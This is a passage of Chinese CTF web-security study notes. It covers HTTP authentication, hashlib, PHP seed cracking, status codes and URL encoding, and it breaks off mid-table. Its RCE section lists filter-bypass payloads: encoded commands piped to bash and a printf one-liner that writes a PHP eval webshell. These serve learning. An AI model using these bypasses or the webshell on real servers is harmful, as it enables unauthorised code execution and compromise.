<p>它通过用户代理发送一个经过 Base64 编码的 <code>用户名:密码</code> 字符串来工作。</p>
<p>尽管实现简单，但基本认证通常不被认为是安全的，因为 Base64 编码非常容易解码，故一般配合 HTTPS 使用以确保安全性。</p>
<p>凭据将是<strong>用户名和密码</strong>的组合，经过 <strong>Base64 编码</strong>后的字符串。客户端将这个编码后的凭据放入 <code>Authorization</code>  头并发送回服务器进行认证。</p>
<h4 id="2摘要认证digest-authentication"><a class="anchor" href="#2摘要认证digest-authentication">#</a> 2. 摘要认证（Digest Authentication）</h4>
<p>摘要认证在安全性上比基本认证更高一步，因为它使用了 <strong>MD5 散列函数来传输密码</strong>。尽管比基本认证更为安全，但摘要认证也有一些安全漏洞，并且在现代 Web 应用中不如其他认证机制流行。</p>
<h4 id="3token-认证如-bearer-令牌token-authentication"><a class="anchor" href="#3token-认证如-bearer-令牌token-authentication">#</a> 3.Token 认证，如 Bearer 令牌（Token Authentication）</h4>
<ul>
<li>客户端发送一个密钥（token），它由服务器验证且通常是持有密钥用户识别令牌。</li>
</ul>
<p>Token 认证是一种更为安全的认证方法，广泛用于当前的 Web 应用中，特别是在 RESTful API 认证中。一个常见的实施方式是使用 Bearer tokens。</p>
<h4 id="4oauth"><a class="anchor" href="#4oauth">#</a> 4.OAuth</h4>
<p>OAuth 是一个用于授权的开放标准，它允许用户让第三方应用访问自己存储在另一服务提供商上的信息，而无需将用户名和密码直接提供给第三方应用。OAuth 可以用来提供认证（OAuth 2.0）和授权，例如允许应用代表用户去访问 Google 或 Facebook 上的数据。</p>
<h4 id="api-密钥api-keys"><a class="anchor" href="#api-密钥api-keys">#</a> API 密钥（API Keys）</h4>
<p>API 密钥是由服务器预先生成的一组字符，客户端将其作为访问 API 资源的凭据。API 密钥通常作为请求的一部分发送，可以放在 URL、请求头或请求体中。虽然 API 密钥方便易用，但比较适用于对安全需求不是特别高的场景，且通常与其他手段（如限制 IP 地址）结合使用来增加安全性。</p>
<h1 id="http请求方式get-post"><a class="anchor" href="#http请求方式get-post">#</a> http 请求方式（GET、POST）</h1>
<p>**GET 传参:**url/? 参数名 = 参数值</p>
<p>**POST 传参:**post 传参使用火狐插件 HackBar,</p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAyMTc0NTUwMDk5LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250102174550099.png</span>&quot; alt=&quot;image-20250102174550099&quot; style=&quot;zoom:67%;&quot; /&gt;</p>
<h1 id="python-hashlib库"><a class="anchor" href="#python-hashlib库">#</a> python hashlib 库</h1>
<p>要使用 <strong>hashlib</strong> 函数必须先导入：</p>
<pre><code>import hashlib 
</code></pre>
<p><strong>hashlib</strong> 模块主要用于进行哈希（hash）操作。哈希（Hash）是一种将任意长度的输入数据映射为固定长度输出数据的算法。哈希通常用于验证数据的完整性、安全存储密码等场景。</p>
<p>哈希函数的输出通常是一串看似随机的字母和数字。hashlib 模块提供了常见的哈希算法的实现，如 MD5、SHA-1、SHA-256 等</p>
<ul>
<li>
<p><strong>hashlib.md5() / hashlib.sha1() / hashlib.sha256() / ...</strong>: 直接使用特定的哈希算法</p>
</li>
<li>
<p><strong>hexdigest()</strong>: 获取十六进制表示的哈希值</p>
</li>
<li>
<p><strong>digest()</strong>: 获取二进制表示的哈希值。</p>
</li>
</ul>
<p>实例</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string">'RUNOOB'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#pyhton3 中必须先对字符串 str 进行 utf-8 编码</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"16:"</span><span class="token punctuation">,</span>md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#转化为 16 进制</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>md5_hash<span class="token punctuation">)</span> <span class="token comment">#仅仅是加密后</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#转换为 10 进制</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#输出结果为：</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#16: 18fa661e2a4a7dd6471cc1407290cf6e</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#&lt;md5 _hashlib.HASH object @ 0x7efe92bfdfd0></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">#33201617309184560926823112838432739182</span></pre></td></tr></table></figure><h1 id="cookie"><a class="anchor" href="#cookie">#</a> Cookie：</h1>
<p>http 的 Cookie 请求：例如：（token 是 php 中定义的参数名）</p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAzMDAyNjE0MTY4LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250103002614168.png</span>&quot; alt=&quot;image-20250103002614168&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAzMDAyNzA5MTI1LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250103002709125.png</span>&quot; alt=&quot;image-20250103002709125&quot; style=&quot;zoom:67%;&quot; /&gt;</p>
<p>在 hackbar 中：</p>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTAzMDAyODEzMjQzLnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250103002813243.png</span>&quot; alt=&quot;image-20250103002813243&quot; style=&quot;zoom:50%;&quot; /&gt;</p>
<h1 id="php随机数详见php相关内容"><a class="anchor" href="#php随机数详见php相关内容">#</a> PHP 随机数（详见 PHP 相关内容）</h1>
<p>对于 PHP 生成随机数的种子 seed,(用同一个随机数序列进行推出种子，在获得该种子生成的其他随机数)，可以用 <code>php_mt_seed工具进行爆破获得种子值</code> ：</p>
<ul>
<li>当随机数为字符串时需要转为 16 进制（本身是十进制就直接进入步骤二）：pwn 虚拟机 web/php_mt_seed-4.0 文件夹内终端输入 <code>php seed.php 随机数</code> 即可</li>
<li>pwn 虚拟机 web/php_mt_seed-4.0 文件夹内终端输入 <code>./php_mt_seed 16进制值或10进制</code> 即可获得种子</li>
<li>再用该种子获得其他随机数</li>
</ul>
<h1 id="路径爆破"><a class="anchor" href="#路径爆破">#</a> 路径爆破：</h1>
<p>有如 302 状态码是重定向，且找不到任何头绪，<strong>扫描目录全是递归命名</strong>，有时需要进行路径爆破</p>
<h1 id="http状态码"><a class="anchor" href="#http状态码">#</a> HTTP 状态码：</h1>
<ul>
<li><strong>304</strong>：服务端已经执行了 GET，但文件未变化。</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">状态码</th>
<th style="text-align:left">状态码英文名称</th>
<th style="text-align:left">中文描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">100</td>
<td style="text-align:left">Continue</td>
<td style="text-align:left">继续。客户端应继续其请求</td>
</tr>
<tr>
<td style="text-align:left">101</td>
<td style="text-align:left">Switching Protocols</td>
<td style="text-align:left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到 HTTP 的新版本协议</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">200</td>
<td style="text-align:left">OK</td>
<td style="text-align:left">请求成功。一般用于 GET 与 POST 请求</td>
</tr>
<tr>
<td style="text-align:left">201</td>
<td style="text-align:left">Created</td>
<td style="text-align:left">已创建。成功请求并创建了新的资源</td>
</tr>
<tr>
<td style="text-align:left">202</td>
<td style="text-align:left">Accepted</td>
<td style="text-align:left">已接受。已经接受请求，但未处理完成</td>
</tr>
<tr>
<td style="text-align:left">203</td>
<td style="text-align:left">Non-Authoritative Information</td>
<td style="text-align:left">非授权信息。请求成功。但返回的 meta 信息不在原始的服务器，而是一个副本</td>
</tr>
<tr>
<td style="text-align:left">204</td>
<td style="text-align:left">No Content</td>
<td style="text-align:left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
</tr>
<tr>
<td style="text-align:left">205</td>
<td style="text-align:left">Reset Content</td>
<td style="text-align:left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td>
</tr>
<tr>
<td style="text-align:left">206</td>
<td style="text-align:left">Partial Content</td>
<td style="text-align:left">部分内容。服务器成功处理了部分 GET 请求</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">300</td>
<td style="text-align:left">Multiple Choices</td>
<td style="text-align:left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td>
</tr>
<tr>
<td style="text-align:left">301</td>
<td style="text-align:left">Moved Permanently</td>
<td style="text-align:left">永久移动。请求的资源已被永久的移动到新 URI，返回信息会包括新的 URI，浏览器会自动定向到新 URI。今后任何新的请求都应使用新的 URI 代替</td>
</tr>
<tr>
<td style="text-align:left">302</td>
<td style="text-align:left">Found</td>
<td style="text-align:left">临时移动。与 301 类似。但资源只是临时被移动。客户端应继续使用原有 URI</td>
</tr>
<tr>
<td style="text-align:left">303</td>
<td style="text-align:left">See Other</td>
<td style="text-align:left">查看其它地址。与 301 类似。使用 GET 和 POST 请求查看</td>
</tr>
<tr>
<td style="text-align:left">304</td>
<td style="text-align:left">Not Modified</td>
<td style="text-align:left">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td>
</tr>
<tr>
<td style="text-align:left">305</td>
<td style="text-align:left">Use Proxy</td>
<td style="text-align:left">使用代理。所请求的资源必须通过代理访问</td>
</tr>
<tr>
<td style="text-align:left">306</td>
<td style="text-align:left">Unused</td>
<td style="text-align:left">已经被废弃的 HTTP 状态码</td>
</tr>
<tr>
<td style="text-align:left">307</td>
<td style="text-align:left">Temporary Redirect</td>
<td style="text-align:left">临时重定向。与 302 类似。使用 GET 请求重定向</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">400</td>
<td style="text-align:left">Bad Request</td>
<td style="text-align:left">客户端请求的语法错误，服务器无法理解</td>
</tr>
<tr>
<td style="text-align:left">401</td>
<td style="text-align:left">Unauthorized</td>
<td style="text-align:left">请求要求用户的身份认证</td>
</tr>
<tr>
<td style="text-align:left">402</td>
<td style="text-align:left">Payment Required</td>
<td style="text-align:left">保留，将来使用</td>
</tr>
<tr>
<td style="text-align:left">403</td>
<td style="text-align:left">Forbidden</td>
<td style="text-align:left">服务器理解请求客户端的请求，但是拒绝执行此请求</td>
</tr>
<tr>
<td style="text-align:left">404</td>
<td style="text-align:left">Not Found</td>
<td style="text-align:left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置 &quot;您所请求的资源无法找到&quot; 的个性页面</td>
</tr>
<tr>
<td style="text-align:left">405</td>
<td style="text-align:left">Method Not Allowed</td>
<td style="text-align:left">客户端请求中的方法被禁止</td>
</tr>
<tr>
<td style="text-align:left">406</td>
<td style="text-align:left">Not Acceptable</td>
<td style="text-align:left">服务器无法根据客户端请求的内容特性完成请求</td>
</tr>
<tr>
<td style="text-align:left">407</td>
<td style="text-align:left">Proxy Authentication Required</td>
<td style="text-align:left">请求要求代理的身份认证，与 401 类似，但请求者应当使用代理进行授权</td>
</tr>
<tr>
<td style="text-align:left">408</td>
<td style="text-align:left">Request Time-out</td>
<td style="text-align:left">服务器等待客户端发送的请求时间过长，超时</td>
</tr>
<tr>
<td style="text-align:left">409</td>
<td style="text-align:left">Conflict</td>
<td style="text-align:left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td>
</tr>
<tr>
<td style="text-align:left">410</td>
<td style="text-align:left">Gone</td>
<td style="text-align:left">客户端请求的资源已经不存在。410 不同于 404，如果资源以前有现在被永久删除了可使用 410 代码，网站设计人员可通过 301 代码指定资源的新位置</td>
</tr>
<tr>
<td style="text-align:left">411</td>
<td style="text-align:left">Length Required</td>
<td style="text-align:left">服务器无法处理客户端发送的不带 Content-Length 的请求信息</td>
</tr>
<tr>
<td style="text-align:left">412</td>
<td style="text-align:left">Precondition Failed</td>
<td style="text-align:left">客户端请求信息的先决条件错误</td>
</tr>
<tr>
<td style="text-align:left">413</td>
<td style="text-align:left">Request Entity Too Large</td>
<td style="text-align:left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个 Retry-After 的响应信息</td>
</tr>
<tr>
<td style="text-align:left">414</td>
<td style="text-align:left">Request-URI Too Large</td>
<td style="text-align:left">请求的 URI 过长（URI 通常为网址），服务器无法处理</td>
</tr>
<tr>
<td style="text-align:left">415</td>
<td style="text-align:left">Unsupported Media Type</td>
<td style="text-align:left">服务器无法处理请求附带的媒体格式</td>
</tr>
<tr>
<td style="text-align:left">416</td>
<td style="text-align:left">Requested range not satisfiable</td>
<td style="text-align:left">客户端请求的范围无效</td>
</tr>
<tr>
<td style="text-align:left">417</td>
<td style="text-align:left">Expectation Failed（预期失败）</td>
<td style="text-align:left">服务器无法满足请求头中 Expect 字段指定的预期行为。</td>
</tr>
<tr>
<td style="text-align:left">418</td>
<td style="text-align:left">I'm a teapot</td>
<td style="text-align:left">状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">500</td>
<td style="text-align:left">Internal Server Error</td>
<td style="text-align:left">服务器内部错误，无法完成请求</td>
</tr>
<tr>
<td style="text-align:left">501</td>
<td style="text-align:left">Not Implemented</td>
<td style="text-align:left">服务器不支持请求的功能，无法完成请求</td>
</tr>
<tr>
<td style="text-align:left">502</td>
<td style="text-align:left">Bad Gateway</td>
<td style="text-align:left">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
</tr>
<tr>
<td style="text-align:left">503</td>
<td style="text-align:left">Service Unavailable</td>
<td style="text-align:left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的 Retry-After 头信息中</td>
</tr>
<tr>
<td style="text-align:left">504</td>
<td style="text-align:left">Gateway Time-out</td>
<td style="text-align:left">充当网关或代理的服务器，未及时从远端服务器获取请求</td>
</tr>
<tr>
<td style="text-align:left">505</td>
<td style="text-align:left">HTTP Version not supported</td>
<td style="text-align:left">服务器不支持请求的 HTTP 协议的版本，无法完成处理</td>
</tr>
</tbody>
</table>
<h1 id="命令执行与代码执行见下载rce博客相对全面"><a class="anchor" href="#命令执行与代码执行见下载rce博客相对全面">#</a> 命令执行与代码执行（见下载 RCE 博客，相对全面）</h1>
<ul>
<li>
<p><strong>PHP 代码执行</strong>（eval () 函数等）：看 php 相关内容</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>1.eval($string)：</pre></td></tr><tr><td data-num="2"></td><td><pre>把参数中的字符串当做php代码执行。该字符串必须是合法的代码，且必须以分号结尾。</pre></td></tr><tr><td data-num="3"></td><td><pre>这里强调了合法代码和分号结尾。</pre></td></tr><tr><td data-num="4"></td><td><pre>我们可以理解为eval()执行了一个相当于为$string添加php短标签的功能即 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$string</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>当不能使用分号时，可以利用<span class="token delimiter important">?></span></span>来代替。因为php语法中，最后一句php代码可以不闭合。</pre></td></tr><tr><td data-num="6"></td><td><pre>#这里需要格外指出,eval()是一个语言构造器而不是一个函数，不能被可变函数调用。</pre></td></tr><tr><td data-num="7"></td><td><pre>----------------------------------------------------------------------------------------</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>2.assert($assertion)：</pre></td></tr><tr><td data-num="10"></td><td><pre>如果assertion是字符串,那么将会被assert()当作php代码执行。且可以不以分号结尾。</pre></td></tr><tr><td data-num="11"></td><td><pre>#在PHP7以前assert是作为函数。PHP7以后，assert与eval一样。都是语言构造器。这个知识点可能会出现在$_POST[1]($_POST[2])中</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>----------------------------------------------------------------------------------------</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>3.call_user_func($func,$string):</pre></td></tr><tr><td data-num="16"></td><td><pre>该函数用于函数调用。我们第一个参数作为调用函数，第二个作为回调函数的参数。算不上代码执行。只能说是一个危险函数。</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>4.include()：   </pre></td></tr><tr><td data-num="19"></td><td><pre> 采用伪协议绕过    </pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre>#常见的命令执行函数：</pre></td></tr><tr><td data-num="22"></td><td><pre>#在PHP中，允许我们执行系统程序命令。一般有以下函数：</pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>1.system():</pre></td></tr><tr><td data-num="25"></td><td><pre>执行一个外部程序命令，并且输出执行结果，返回最后一行。</pre></td></tr><tr><td data-num="26"></td><td><pre>#这里理解一下输出执行结果，返回最后一行。是指先将命令执行的结果打印出来，然后再将最后一行作为返回值。</pre></td></tr><tr><td data-num="27"></td><td><pre>#可以理解为它函数内部存在一个 print($result);return last->result;这样子。</pre></td></tr><tr><td data-num="28"></td><td><pre>#如果命令中需要用空格分开的话，就需要对执行的命令加上引号。</pre></td></tr><tr><td data-num="29"></td><td><pre>-------------------------------------------------------------------------------------------------------------------</pre></td></tr><tr><td data-num="30"></td><td><pre>2.exec():</pre></td></tr><tr><td data-num="31"></td><td><pre>执行一个外部程序。并返回执行结果最后一行的内容。(由于不打印输出内容所以最好用passthru())</pre></td></tr><tr><td data-num="32"></td><td><pre>#这里只返回执行结果的最后一行内容。不会有输出打印。</pre></td></tr><tr><td data-num="33"></td><td><pre>-------------------------------------------------------------------------------------------------------------------</pre></td></tr><tr><td data-num="34"></td><td><pre>3.passthru():</pre></td></tr><tr><td data-num="35"></td><td><pre>执行外部程序并且显示原始输出</pre></td></tr><tr><td data-num="36"></td><td><pre>-------------------------------------------------------------------------------------------------------------------</pre></td></tr><tr><td data-num="37"></td><td><pre>4.shell_exec():该函数等价于 ` `</pre></td></tr><tr><td data-num="38"></td><td><pre>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</pre></td></tr><tr><td data-num="39"></td><td><pre>#该函数不会显示执行结果。需要加echo才会打印输出结果。``是shell_exec()的简化形式。实际是同一个函数。</pre></td></tr><tr><td data-num="40"></td><td><pre>-------------------------------------------------------------------------------------------------------------------</pre></td></tr><tr><td data-num="41"></td><td><pre>linux中用于打开文件的函数：</pre></td></tr><tr><td data-num="42"></td><td><pre>find -- 列出当前目录下的文件以及子目录所有文件【替代ls】</pre></td></tr><tr><td data-num="43"></td><td><pre>more:一页一页的显示档案内容</pre></td></tr><tr><td data-num="44"></td><td><pre>less:与 more 类似</pre></td></tr><tr><td data-num="45"></td><td><pre>head:查看头几行</pre></td></tr><tr><td data-num="46"></td><td><pre>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</pre></td></tr><tr><td data-num="47"></td><td><pre>tail:查看尾几行</pre></td></tr><tr><td data-num="48"></td><td><pre>nl：显示的时候，顺便输出行号</pre></td></tr><tr><td data-num="49"></td><td><pre>od:以二进制的方式读取档案内容,搭配-c参数读内容</pre></td></tr><tr><td data-num="50"></td><td><pre>vi:一种编辑器，这个也可以查看</pre></td></tr><tr><td data-num="51"></td><td><pre>vim:一种编辑器，这个也可以查看</pre></td></tr><tr><td data-num="52"></td><td><pre>sort:可以查看</pre></td></tr><tr><td data-num="53"></td><td><pre>uniq:可以查看 #源代码中</pre></td></tr></table></figure></li>
</ul>
<h4 id="特殊字符bypass"><a class="anchor" href="#特殊字符bypass">#</a> 特殊字符 bypass</h4>
<pre><code class="language-PHP">空格bypass:
1.%09
2.重定向 &lt;&gt;
3.$&#123;IFS&#125;
4./**/ 注释符

单词bypass:
1.cat --&gt;ca\t #\反斜杠（又称转义字符）是在正则等语法里面，如果后面跟的字符是正常字符，不需要转义。也就意味着，我们可以在rce漏洞，过滤掉cat ls等命令时候，直接使用ca\t来实现绕过
2.flag --&gt;fl\ag  fl''ag f* 或者fla*
    
3.$1、$2和$@
第一个参数是1，第二个参数是2。而参数不存在时其值为空。所以没有赋值的话就相当于没有
例如：ca$@t fla$@g或者ca$1ca@t fla$2g或者ca$1t fl$1ag.t$1xt

字母bypass:
1.FLAG --&gt;F[9-M][9-M]G
    
base64：
在&quot;Y2F0IGZsYWcudHh0Cg==&quot; | base64 -d下（base64解码）需要通过echo把解码内容输出，即cat flag.txt,但要注意:这里只是把cat flag.txt文字echo出来，并没有执行

1.使用反引号包含base64解码后的命令
`echo &quot;Y2F0IGZsYWcudHh0Cg==&quot; | base64 -d`【好像只能在shell用】

2. 将base64解码后的命令通过管道符传递给bash
echo &quot;Y2F0IGZsYWcudHh0Cg==&quot; | base64 -d | bash

3. base64出文件
一般情况下php文件，cat无法打开，所以用basebase64 1.php相当于cat 1.php|base64，输出的是base64后的  
编码绕过：
base64：
echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash  ==&gt; cat /flag
echo Y2F0IC9mbGFn|base64 -d|sh      ==&gt; cat /flag

#hex
echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash   ==&gt; cat /flag#xxd - r -p可以转换16进制，同样用户管道符之后。
    
#oct字节
$(printf &quot;\154\163&quot;) ==&gt;ls
$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag
&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag
#i也可以通过这种方式写马
#内容为&lt;?php @eval($_POST['c']);?&gt;
$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php
</code></pre>
<h4 id="重定义get-bypass"><a class="anchor" href="#重定义get-bypass">#</a> 重定义 $GET bypass</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>前提<span class="token punctuation">:</span>存在代码执行函数</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">eavl</span><span class="token punctuation">(</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h1 id="url编码"><a class="anchor" href="#url编码">#</a> URL 编码：</h1>
<p>URL 不能包含空格。**URL 编码通常使用加号（+）或 %20 替代空格。**url 编码就是在 <code>ascii编码前加上%</code></p>
<table>
<thead>
<tr>
<th style="text-align:left">字符</th>
<th style="text-align:left">来自 Windows-1252</th>
<th style="text-align:left">来自 UTF-8</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">space</td>
<td style="text-align:left">%20</td>
<td style="text-align:left">%20</td>
</tr>
<tr>
<td style="text-align:left">!</td>
<td style="text-align:left">%21</td>
<td style="text-align:left">%21</td>
</tr>
<tr>
<td style="text-align:left">&quot;</td>
<td style="text-align:left">%22</td>
<td style="text-align:left">%22</td>
</tr>
<tr>
<td style="text-align:left">#</td>
<td style="text-align:left">%23</td>
<td style="text-align:left">%23</td>
</tr>
<tr>
<td style="text-align:left">$</td>
<td style="text-align:left">%24</td>
<td style="text-align:left">%24</td>
</tr>
<tr>
<td style="text-align:left">%</td>
<td style="text-align:left">%25</td>
<td style="text-align:left">%25</td>
</tr>
<tr>
<td style="text-align:left">&amp;</td>
<td style="text-align:left">%26</td>
<td style="text-align:left">%26</td>
</tr>
<tr>
<td style="text-align:left">'</td>
<td style="text-align:left">%27</td>
<td style="text-align:left">%27</td>
</tr>
<tr>
<td style="text-align:left">(</td>
<td style="text-align:left">%28</td>
<td style="text-align:left">%28</td>
</tr>
<tr>
<td style="text-align:left">)</td>
<td style="text-align:left">%29</td>
<td style="text-align:left">%29</td>
</tr>
<tr>
<td style="text-align:left">*</td>
<td style="text-align:left">%2A</td>
<td style="text-align:left">%2A</td>
</tr>
<tr>
<td style="text-align:left">+</td>
<td style="text-align:left">%2B</td>
<td style="text-align:left">%2B</td>
</tr>
<tr>
<td style="text-align:left">,</td>
<td style="text-align:left">%2C</td>
<td style="text-align:left">%2C</td>
</tr>
<tr>
<td style="text-align:left">-</td>
<td style="text-align:left">%2D</td>
<td style="text-align:left">%2D</td>
</tr>
<tr>
<td style="text-align:left">.</td>
<td style="text-align:left">%2E</td>
<td style="text-align:left">%2E</td>
</tr>
<tr>
<td style="text-align:left">/</td>
<td style="text-align:left">%2F</td>
<td style="text-align:left">%2F</td>
</tr>
<tr>
<td style="text-align:left">0</td>
<td style="text-align:left">%30</td>
<td style="text-align:left">%30</td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">%31</td>
<td style="text-align:left">%31</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">%32</td>
<td style="text-align:left">%32</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">%33</td>
<td style="text-align:left">%33</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">%34</td>
<td style="text-align:left">%34</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left">%35</td>
<td style="text-align:left">%35</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left">%36</td>
<td style="text-align:left">%36</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">%37</td>
<td style="text-align:left">%37</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left">%38</td>
<td style="text-align:left">%38</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:left">%39</td>
<td style="text-align:left">%39</td>
</tr>
<tr>
<td style="text-align:left">:</td>
<td style="text-align:left">%3A</td>
<td style="text-align:left">%3A</td>
</tr>
<tr>
<td style="text-align:left">;</td>
<td style="text-align:left">%3B</td>
<td style="text-align:left">%3B</td>
</tr>
<tr>
<td style="text-align:left">&lt;</td>
<td style="text-align:left">%3C</td>
<td style="text-align:left">%3C</td>
</tr>
<tr>
<td style="text-align:left">=</td>
<td style="text-align:left">%3D</td>
<td style="text-align:left">%3D</td>
</tr>
<tr>
<td style="text-align:left">&gt;</td>
<td style="text-align:left">%3E</td>
<td style="text-align:left">%3E</td>
</tr>
<tr>
<td style="text-align:left">?</td>
<td style="text-align:left">%3F</td>
<td style="text-align:left">%3F</td>
</tr>
<tr>
<td style="text-align:left">@</td>
<td style="text-align:left">%40</td>
<td style="text-align:left">%40</td>
</tr>
<tr>
<td style="text-align:left">A</td>
<td style="text-align:left">%41</td>
<td style="text-align:left">%41</td>
</tr>
<tr>
<td style="text-align:left">B</td>
<td style="text-align:left">%42</td>
<td style="text-align:left">%42</td>
</tr>
<tr>
<td style="text-align:left">C</td>
<td style="text-align:left">%43</td>
<td style="text-align:left">%43</td>
</tr>
<tr>
<td style="text-align:left">D</td>
<td style="text-align:left">%44</td>
<td style="text-align:left">%44</td>
</tr>
<tr>
<td style="text-align:left">E</td>
<td style="text-align:left">%45</td>
<td style="text-align:left">%45</td>
</tr>
<tr>
<td style="text-align:left">F</td>
<td style="text-align:left">%46</td>
